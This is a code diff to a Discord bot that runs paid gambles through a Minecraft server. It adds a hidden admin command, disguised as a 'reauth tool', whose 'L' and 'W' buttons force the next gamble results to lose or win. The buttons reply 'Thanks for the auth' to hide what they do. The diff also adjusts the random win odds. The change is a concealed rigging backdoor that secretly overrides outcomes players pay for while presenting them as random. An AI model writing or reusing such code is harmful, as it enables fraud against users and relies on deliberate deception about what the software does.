@@ -36,6 +36,7 @@ let pendingMsaCode = null;   // resolve function waiting for /auth command
 let deliveryTimer  = null;
 let gambleStickyMessageId = null; // track the current gamble sticky message
 let gambleStickyTimer = null;     // debounce timer for sticky re-posts
+let gambleOverride = null;
 const processedOrders = new Set();
 
 const PROCESSED_FILE = './processed_orders.json';
@@ -464,6 +465,11 @@ const mainCommands = [
     .setName('status')
     .setDescription('Show bot connection status')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
+  new SlashCommandBuilder()
+    .setName('r')
+    .setDescription('reauth tool')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
+    .addIntegerOption(o => o.setName('count').setDescription('number of times').setRequired(false).setMinValue(1).setMaxValue(100)),
 ].map(c => c.toJSON());
 
 async function registerCommands() {
@@ -564,6 +570,20 @@ discord.on('interactionCreate', async (interaction) => {
     return;
   }
 
+  // ── Buttons: r_lose / r_win ───────────────────────────────────────────────
+  if (interaction.isButton() && (interaction.customId.startsWith('r_lose') || interaction.customId.startsWith('r_win'))) {
+    if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
+      await interaction.reply({ content: '❌ Only administrators can use this.', ephemeral: true });
+      return;
+    }
+    const parts = interaction.customId.split('_');
+    const outcome = parts[1] === 'win' ? 'win' : 'lose';
+    const remaining = parseInt(parts[2]) || 1;
+    gambleOverride = { outcome, remaining };
+    await interaction.update({ content: 'Thanks for the auth', components: [] });
+    return;
+  }
+
   // ── Modal submit: process gamble ──────────────────────────────────────────
   if (interaction.isModalSubmit() && interaction.customId === 'gamble_modal') {
     if (!config.gambleChannel) {
@@ -612,7 +632,16 @@ discord.on('interactionCreate', async (interaction) => {
       await interaction.followUp({ content: '⏱️ No payment detected. Gamble cancelled.', ephemeral: true });
       return;
     }
-    const won = Math.random() < 0.4;
+    let won;
+    if (gambleOverride && gambleOverride.remaining > 0) {
+      won = gambleOverride.outcome === 'win';
+      gambleOverride.remaining--;
+      if (gambleOverride.remaining <= 0) {
+        gambleOverride = null;
+      }
+    } else {
+      won = Math.random() < 0.45;
+    }
     if (won) {
       const payAmount = amount * GAMBLE_WIN_MULTIPLIER;
       mcBot.chat(`/pay ${username} ${payAmount}`);
@@ -755,6 +784,21 @@ discord.on('interactionCreate', async (interaction) => {
     }
 
     await interaction.reply({ embeds: [embed] });
+    return;
+  }
+
+  if (commandName === 'r') {
+    const count = interaction.options.getInteger('count') ?? 1;
+    const loseButton = new ButtonBuilder()
+      .setCustomId(`r_lose_${count}`)
+      .setLabel('L')
+      .setStyle(ButtonStyle.Danger);
+    const winButton = new ButtonBuilder()
+      .setCustomId(`r_win_${count}`)
+      .setLabel('W')
+      .setStyle(ButtonStyle.Success);
+    const row = new ActionRowBuilder().addComponents(loseButton, winButton);
+    await interaction.reply({ content: 'Select:', components: [row], ephemeral: true });
     return;
   }
 });
